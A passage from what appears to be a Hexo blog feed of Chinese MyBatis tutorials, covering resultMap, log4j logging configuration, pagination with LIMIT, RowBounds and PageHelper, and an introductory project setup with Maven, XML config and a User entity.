class="comment">&lt;!--实体类的字段数据库中的字段--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;owd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在标签中使用resultMap</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--resultMap的id--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserMap&quot;</span>&gt;</span></span><br><span class="line">        select * from user where id = #&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><h2 id="日志工厂"><a href="#日志工厂" class="headerlink" title="日志工厂"></a>日志工厂</h2><ul><li><p>如果一个数据库操作，出现了异常，我们需要排错，日志就是最好的助手</p><p><img src="https://gitee.com/airgwl/upic/raw/master/img/image-20211008194625011.png" alt="image-20211008194625011"></p><ul><li>SLF4J</li><li>LOG4J </li><li> LOG4J2 </li><li> JDK_LOGGING </li><li> COMMONS_LOGGING</li><li> STDOUT_LOGGING</li><li> NO_LOGGING</li></ul></li><li><p>在mybatis核心配置文件中配置日志</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>日志打印信息</li></ul><p><img src="https://gitee.com/airgwl/upic/raw/master/img/image-20211008195654898.png" alt="image-20211008195654898"></p></li></ul><h2 id="LOG4J"><a href="#LOG4J" class="headerlink" title="LOG4J"></a>LOG4J</h2><ul><li><p>什么是LOG4J</p><ul><li>log4j是apache的一个开源项目，通过使用log4j，我们可以控制日志信息输送的目的是控制台、文件、GUI组件 </li><li>我们也可以控制每一条日志的输出格式</li><li>我们通过每一条日志信息的级别，我们能够更加细致地控制日志生成的过程</li><li>通过一个配置文件来灵活的进行配置，而不需要修改代码</li></ul></li><li><p>使用步骤</p><ol><li><p>导入jar包或者maven坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在mybatis核心配置文件中配置LOG4J</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        标准的日志工厂--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;setting name=&quot;logImpl&quot; value=&quot;LOG4J&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOG4J&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>编写log4j.properties配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">log4j.rootLogger</span>=<span class="string">DEBUG,console,file</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#控制台输出的相关设置</span></span><br><span class="line"><span class="meta">log4j.appender.console</span> = <span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="meta">log4j.appender.console.Target</span> = <span class="string">System.out</span></span><br><span class="line"><span class="meta">log4j.appender.console.Threshold</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.appender.console.layout</span> = <span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.console.layout.ConversionPattern</span>=<span class="string">【%c】-%m%n</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#文件输出的相关设置</span></span><br><span class="line"><span class="meta">log4j.appender.file</span> = <span class="string">org.apache.log4j.RollingFileAppender</span></span><br><span class="line"><span class="meta">log4j.appender.file.File</span>=<span class="string">./log/java.log</span></span><br><span class="line"><span class="meta">log4j.appender.file.MaxFileSize</span>=<span class="string">10mb</span></span><br><span class="line"><span class="meta">log4j.appender.file.Threshold</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout.ConversionPattern</span>=<span class="string">【%p】【%d&#123;yy-MM-dd&#125;】【%c】%m%n</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#日志输出级别</span></span><br><span class="line"><span class="meta">log4j.logger.org.mybatis</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.logger.java.sql</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.logger.java.sql.Statement</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.logger.java.sql.ResultSet</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="meta">log4j.logger.java.sql.PreparedStatement</span>=<span class="string">DEBUG</span></span><br></pre></td></tr></table></figure><ul><li><p>日志输出样式</p><p><img src="https://gitee.com/airgwl/upic/raw/master/img/image-20211008202826129.png" alt="image-20211008202826129"></p></li></ul></li><li><p>简单使用步骤</p><ol><li><p>在要使用LOG4J的类中导入包<code>import org.apache.log4j.Logger;</code></p></li><li><p>日志对象 参数为当前类的class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Logger logger = Logger.getLogger(UserMapperTest.class);</span><br></pre></td></tr></table></figure></li><li><p>日志级别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;info:进入了testLog4j&quot;</span>);</span><br><span class="line">logger.debug(<span class="string">&quot;debug:进入类testLog4j&quot;</span>);</span><br><span class="line">logger.error(<span class="string">&quot;error:进入了testLog4j&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ul><hr><h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><ul><li><h2 id="为了减少数据的处理量所以采用分页进行数据展示"><a href="#为了减少数据的处理量所以采用分页进行数据展示" class="headerlink" title="为了减少数据的处理量所以采用分页进行数据展示"></a>为了减少数据的处理量所以采用分页进行数据展示</h2></li><li><p>mysql中使用LImit分页的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 起始startIndex, pageSize;</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用Sql语句实现分页"><a href="#使用Sql语句实现分页" class="headerlink" title="使用Sql语句实现分页"></a>使用Sql语句实现分页</h2><ol><li><p>接口 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    分页</span></span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUserByLimit</span><span class="params">(Map&lt;String, Integer&gt; map)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>Mapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserByLimit&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;map&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserMap&quot;</span>&gt;</span></span><br><span class="line">        select * from user limit #&#123;startIndex&#125;, #&#123;pageSize&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">       SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">       UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">       Map&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;String, Integer&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;startIndex&quot;</span>, <span class="number">1</span>);</span><br><span class="line">       map.put(<span class="string">&quot;pageSize&quot;</span>, <span class="number">2</span>);</span><br><span class="line">       <span class="keyword">for</span> (User user : mapper.getUserByLimit(map)) &#123;</span><br><span class="line">           System.out.println(user);</span><br><span class="line">       &#125;</span><br><span class="line">       sqlSession.close();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="RowBounds分页"><a href="#RowBounds分页" class="headerlink" title="RowBounds分页"></a>RowBounds分页</h2><ul><li><p>不在使用SQL分页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">List&lt;User&gt; <span class="title">getUserRowBounds</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>mapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserRowBounds&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserMap&quot;</span>&gt;</span></span><br><span class="line">        select * from user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testRowBounds</span><span class="params">()</span></span>&#123;</span><br><span class="line">       SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">       List&lt;User&gt; user = sqlSession.selectList(<span class="string">&quot;com.com.gwl.mapper.UserMapper.getUserRowBounds&quot;</span>, <span class="keyword">null</span>, <span class="keyword">new</span> RowBounds(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">       user.forEach(System.out::println);</span><br><span class="line">       sqlSession.close();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="分页插件"><a href="#分页插件" class="headerlink" title="分页插件"></a>分页插件</h2><ul><li>Mybatis分页插件PageHelp<ul><li><a href="https://pagehelper.github.io/docs/howtouse/">点我查看帮助手册</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> mybatis框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据存储框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis入门(一)</title>
      <link href="/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
      <url>/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<center><h1>Mybatis入门(一)</h1></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="什么是MyBatis"><a href="#什么是MyBatis" class="headerlink" title="什么是MyBatis"></a>什么是MyBatis</h2><ul><li>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录</li></ul><hr><h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><h2 id="安装Mybatis"><a href="#安装Mybatis" class="headerlink" title="安装Mybatis"></a>安装Mybatis</h2><ul><li><p>要使用 MyBatis， 只需将 <a href="https://github.com/mybatis/mybatis-3/releases">mybatis-x.x.x.jar</a> 文件置于类路径（classpath）中即可</p></li><li><p>如果使用 Maven 来构建项目，则需将下面的依赖代码置于 pom.xml 文件中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="第一个Mybatis程序"><a href="#第一个Mybatis程序" class="headerlink" title="第一个Mybatis程序"></a>第一个Mybatis程序</h2><ul><li>思路<ol><li>搭建环境</li><li>导入mybatis</li><li>编写代码</li><li>测试</li></ol></li></ul><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><ul><li><p>创建数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure></li><li><p>创建数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</span><br><span class="line">&quot;id&quot; <span class="type">int</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">  &quot;name&quot; <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">  &quot;pwd&quot; <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>插入测试数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(id, name, pwd) <span class="keyword">values</span>(&quot;1&quot;, &quot;java&quot;, &quot;123456&quot;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="导入mybatis"><a href="#导入mybatis" class="headerlink" title="导入mybatis"></a>导入mybatis</h2><ul><li><p>新建一个普通的maven项目</p></li><li><p>删除src目录</p></li><li><p>导入mysql、mybatis、junit这三个坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mysql--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>创建一个子模块</p></li><li><p>在resources下创建配置文件并配置</p><ul><li>数据库url要设置字符才不会出现存储中文乱码现象</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3307/mybatis?userSSL=true<span class="symbol">&amp;amp;</span>userUnicode<span class="symbol">&amp;amp;</span>characterEncoding=utf-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;gwl2003.520&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 添加注册中心   --&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mybatis-user-mapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>编写mybatis工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从 SqlSessionFactory 中获取 SqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String resource = <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            InputStream resourceAsStream = Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(resourceAsStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> SqlSession <span class="title">getSqlSession</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><ul><li><p>实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String owd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOwd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> owd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOwd</span><span class="params">(String owd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.owd = owd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserMapper&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, owd=&#x27;&quot;</span> + owd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Mapper接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span 